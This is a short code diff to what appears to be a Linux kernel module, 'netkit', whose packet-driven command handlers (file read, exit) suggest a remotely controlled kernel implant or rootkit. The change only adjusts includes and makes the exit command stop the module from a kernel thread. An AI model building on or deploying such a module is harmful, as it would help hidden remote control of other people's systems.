@@ -3,6 +3,9 @@
 #include <linux/inet.h>
 #include <linux/net.h>
 #include <linux/syscalls.h>
+#include <linux/kthread.h>
+#include <linux/freezer.h>
+#include <linux/sched.h>
 
 #include "handlers.h"
 
@@ -10,8 +13,9 @@
 #include "../../sys/mem.h"
 #include "../../sys/socket.h"
 #include "../../sys/file.h"
-#include "../../netkit.h"
 #include "../../sys/symbol.h"
+#include "../../sys/task.h"
+#include "../../netkit.h"
 
 int cmd_handle_file_read(const packet_req_t *packet, u8 **res_buf, size_t *res_buflen)
 {
@@ -120,6 +124,10 @@ LAB_OUT_NO_SOCK:
 
 int cmd_handle_exit(const packet_req_t *packet, u8 **res_buf, size_t *res_buflen)
 {
+    // run as kthread so underlaying layers can cleanup and round up the IO
+    // conn-xyz --[spawn]--> netkit-exit --[call]--> netkit->exit() --[kill]--> netkit-conn-loop 
+    // there is a race condition
+    kthread_run(module_stop, netkit_module, "netkit-exit");
 
-    return -1;
+    return 0;
 }
